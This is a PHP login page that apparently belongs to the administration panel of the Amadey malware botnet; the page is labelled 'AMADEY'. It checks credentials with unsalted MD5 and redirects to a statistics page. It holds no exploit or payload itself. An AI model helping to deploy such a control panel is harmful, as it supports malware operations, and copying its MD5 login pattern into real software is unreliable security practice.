<?php
    include( "config.php" );

    session_start();

    error_reporting( 0 );
    
    if ( isset( $_POST["login"]) && isset( $_POST["password"] ) )
    {
       $login = $_POST["login"];
       $password = $_POST["password"];

       if ( ( $login == $conf["login"] ) && ( md5( $password ) == $conf["password"] ) )
       {
          $_SESSION["Name"] = $login;

          @header( "Refresh: 0; url = statistic.php" );
       }
       else
       {
          header( "Refresh: 1; url = login.php" );
          die( "Login filed" );
       }
    }

    if ( $_GET['logout'] == 1 ) 
    {
       @session_destroy();
       header( "Location: login.php" );
       exit;
    }

    {
       echo "<html>
                <head>
                   <meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">
                   <link rel=\"stylesheet\" type=\"text/css\" href=\"f.st\style.css\">
                   <title>Authorisation</title>
                </head>

                <body>
                      <table border=\"0\" width=\"100%\" height=\"100%\">
                         <tr>
                            <td align=center>
                               <form action=\"login.php\" method=\"post\"> 

                                  <table width=\"500\" height=\"481\" background=\"images\bg_1.png\">
                                     <tr>
                                        <td align=center>

                                           <table border=\"0\" height=\"90\" cellpadding=\"0\" cellspacing=\"0\">

                                              <tr>
                                                 <td>
                                                 </td> 

                                                 <td>
                                                    <div align=\"center\">
                                                       <font size = 2>a2019 \"AMADEY\"</font>&nbsp;&nbsp;
                                                    </div>
                                                 </td>
                                              </tr>

                                              <tr>
                                                 <td>
                                                    <img src=\"images\l0.png\">
                                                 </td>

                                                 <td align=left>
                                                    <input type=\"text\" class=task name=\"login\">
                                                 </td>
                                              </tr>

                                              <tr>  
                                                 <td>
                                                    <img src=\"images\l1.png\">
                                                 </td>
                                              
                                                 <td>
                                                    <input type=\"password\" class=task name=\"password\">
                                                 </td>
                                              </tr>

                                              <tr>   
                                                 <td>
                                                    
                                                 </td>
                                              
                                                 <td>
                                                    <div align=\"center\">
                                                       <input type=\"submit\" class=\"button\" value=\"Unlock\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                    </div> 
                                                 </td>
                                              </tr>
                                           </table>

                                        </td>
                                     </tr>
                                  </table>

                               </form>
                            </td>
                         </tr>
                      </table>
          
                </body>
             </html>";
     }
?>


